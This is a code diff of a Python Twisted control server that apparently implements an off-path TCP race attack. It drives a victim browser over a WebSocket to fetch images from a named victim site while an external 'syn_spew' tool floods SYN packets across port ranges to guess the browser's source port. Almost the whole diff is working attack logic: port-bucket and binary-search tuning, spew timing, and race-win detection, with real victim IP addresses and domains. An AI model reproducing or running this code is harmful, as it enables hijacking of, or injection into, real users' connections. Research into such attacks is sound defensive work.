@@ -34,22 +34,28 @@ class WebSocketServerFactory(Factory):
         return p
 
 
-NUM_BUCKETS = 50
+NUM_BUCKETS = 100
 LOW_PORT = 32768
 HIGH_PORT = 61000
-LOW_PORT = 37500
-HIGH_PORT = 38500
+#LOW_PORT = 37500
+#HIGH_PORT = 38500
 
 PORT_BUCKET_SIZE = (HIGH_PORT - LOW_PORT) / NUM_BUCKETS
-TEST_VICTIM_IP = '192.168.1.113'
+TEST_VICTIM_IP = '12.168.1.113'
 #VICTIM_SITE = '66.220.149.11'  # can't use non-umich because merit egress filters
 #VICTIM_SITE = '141.212.109.163' # can't use things with -m state --state ESTABLISHED,RELATED, because it will send RST to SYN-ACK
 #VICTIM_SITE = '141.212.113.142' # sorry, cse.umich.edu
+
 VICTIM_SITE = '68.40.51.184' # hobocomp.com! (only usable when victim browser is on umich campus due to merit egress filters)
 VICTIM_SITE_IMG = 'http://%d-x-%d.hobocomp.com/'
-NEW_CONNECTION_PERIOD = 1.0
+
+#VICTIM_SITE = '23.21.237.114'   # factorable.net
+#VICTIM_SITE_IMG = 'http://%d-x-%d.f.hobocomp.com/'
+
+NEW_CONNECTION_PERIOD = 2.0
 CONNECTION_TIMEOUT = 30.0
-SPEW_DELAY_US = '1000'
+SPEW_DELAY_US = '140'
+SPEW_TIME_MS  = '1000'   # if you don't win the race in the first few seconds, you're not going to
 
 class ControlWebSocket(Protocol):
     """
@@ -61,6 +67,7 @@ class ControlWebSocket(Protocol):
         self.addr = addr
         self.calls = 0
         self.spewer_pid = None
+        self.max_port = 0
         print 'control web from %s' % addr
 
     def spawnSpewer(self, low_port, high_port):
@@ -79,7 +86,7 @@ class ControlWebSocket(Protocol):
         #subprocess.call(['./syn_spew', '-p', '%d-%d' % (low_port, high_port), \
         #                 '-r', '100', '-d', '100', self.addr.host, '69.171.242.11:80'])
         os.execvp('./syn_spew', ['./syn_spew', '-p', '%d-%d' % (low_port, high_port), \
-                                '-r', '0', '-d', SPEW_DELAY_US, self.addr.host, '%s:80' % (VICTIM_SITE)])
+                                '-t', SPEW_TIME_MS, '-d', SPEW_DELAY_US, self.addr.host, '%s:80' % (VICTIM_SITE)])
         #sys.exit(0)
 
 
@@ -123,20 +130,32 @@ class ControlWebSocket(Protocol):
             self.min_port = self.mid_port
             self.mid_port = (self.mid_port + self.max_port) / 2
             self.max_port = self.max_port
+
+            # chrome weirdness, when you lose, it skips a port
+            # (something to do with Linux source port hints?)
+            self.min_port += 1
+            self.mid_port += 1
+            self.max_port += 1
         
 
         # since the browser's source port will increment by one each guess,
         # we'll increment here too.
         self.min_port += 1
-        if self.mid_port < HIGH_PORT:
-            self.mid_port += 1
-        if self.max_port < HIGH_PORT:
-            self.max_port += 1
+        self.mid_port += 1
+        self.max_port += 1
+
+        if self.max_port > HIGH_PORT:
+            self.max_port = HIGH_PORT
+        if self.mid_port > HIGH_PORT:
+            self.mid_port = HIGH_PORT
+
+
+
 
     def cleanupOldWebsocket(self):
-        subprocess.call(['./syn_spew', '-R', '-p', '%d-%d' % (self.min_port, self.mid_port), \
-                         '-r', '3', '-d', SPEW_DELAY_US, self.addr.host, '%s:80' % (VICTIM_SITE)])
-        print 'done'
+        #subprocess.call(['./syn_spew', '-R', '-p', '%d-%d' % (self.min_port, self.mid_port), \
+        #                 '-r', '3', '-d', SPEW_DELAY_US, self.addr.host, '%s:80' % (VICTIM_SITE)])
+        #print 'done'
 
         if self.bucket_search:
             # now we will use binary search
@@ -155,7 +174,7 @@ class ControlWebSocket(Protocol):
         Haven't heard back from websocket in a while, maybe this bucket won?!
         """
 
-        self.websocketTimeoutCb = None  # ha, we win
+        #self.websocketTimeoutCb = None  # ha, we win
         print 'websocket timeout, killing... (%d-%d)' % (self.min_port, self.mid_port)
 
         if self.spewer_pid != None:
@@ -175,7 +194,7 @@ class ControlWebSocket(Protocol):
         if self.bucket_search:
             (self.min_port, self.mid_port) = self.getBucketPortRange()
         
-        print 'firing %d-%d' % (self.min_port, self.mid_port)
+        print 'firing %d-%d (%d)' % (self.min_port, self.mid_port, self.max_port)
 
         self.spawnSpewer(self.min_port, self.mid_port)
 
@@ -187,12 +206,30 @@ class ControlWebSocket(Protocol):
         self.transport.write("img %s" % (VICTIM_SITE_IMG % (random.randint(0,10000000), random.randint(0,10000000)))) # toodo: just increment, birthday-attack boy.
 
         self.fire_time = time.time()
-        self.websocketTimeoutCb = reactor.callLater(CONNECTION_TIMEOUT, self.websocketTimeout)
+
+        # no need to call websocketTimeout, since client javascript will time itself out
+        #self.websocketTimeoutCb = reactor.callLater(CONNECTION_TIMEOUT, self.websocketTimeout)
         
 
     def dataReceived(self, data):
         #log.msg("Got %r" % (data,))
-        if data == 'closed':
+        if data == 'closed' or data == 'timeout':
+
+            adjust_ok = True
+            if data == 'closed':
+                we_won = False
+                print 'Lost the race'
+            else:
+                we_won = True
+                print 'Won the race'
+                if self.bucket_search:
+                    # now we will use binary search
+                    self.bucket_search = False
+                    adjust_ok = False    # don't adjust these values:
+    
+                    (self.min_port, self.max_port) = self.getBucketPortRange() 
+                    self.mid_port = (self.min_port + self.max_port) / 2
+
             if self.spewer_pid != None:
                 os.kill(self.spewer_pid, signal.SIGKILL)
                 self.spewer_pid = None
@@ -204,20 +241,30 @@ class ControlWebSocket(Protocol):
                     print 'Ah, well that is the game :('
                     reactor.stop()
                     return
+            elif adjust_ok:
+                self.adjustBucket(we_won)                
 
             if (self.fire_time != None):
                 print 'diff: %f' % (time.time() - self.fire_time)
             
-            if self.websocketTimeoutCb != None:
+            #if self.websocketTimeoutCb != None:
                 # We have a timeout callback outstanding we need to cancel
-                self.websocketTimeoutCb.cancel()
+                #self.websocketTimeoutCb.cancel()
 
-            if not(self.bucket_search):
-                self.adjustBucket(False) # The browser's source port was NOT in this bucket
+            reactor.callLater(NEW_CONNECTION_PERIOD, self.fireAgain)
 
+        elif data == 'calmed':
+            # The browser has initialized itself and is ready to begin bucket search
+            if (self.fire_time != None):
+                print 'diff: %f' % (time.time() - self.fire_time)
             reactor.callLater(NEW_CONNECTION_PERIOD, self.fireAgain)
 
     def connectionMade(self):
         self.bucket_search = True
         self.bucket = 0
-        self.fireAgain()
+        
+        # Tell that browser to open a connection to get rid of the "Chrome opens 5-50 connections
+        # for whatever the fuck reason when first asked, then calms the fuck down and only opens 1
+        # (or 2, you never know) to it next time.
+        self.fire_time = time.time()
+        self.transport.write("calm %s" % (VICTIM_SITE_IMG % (random.randint(0,10000000), random.randint(0,10000000)))) # toodo: just increment, birthday-attack boy. 
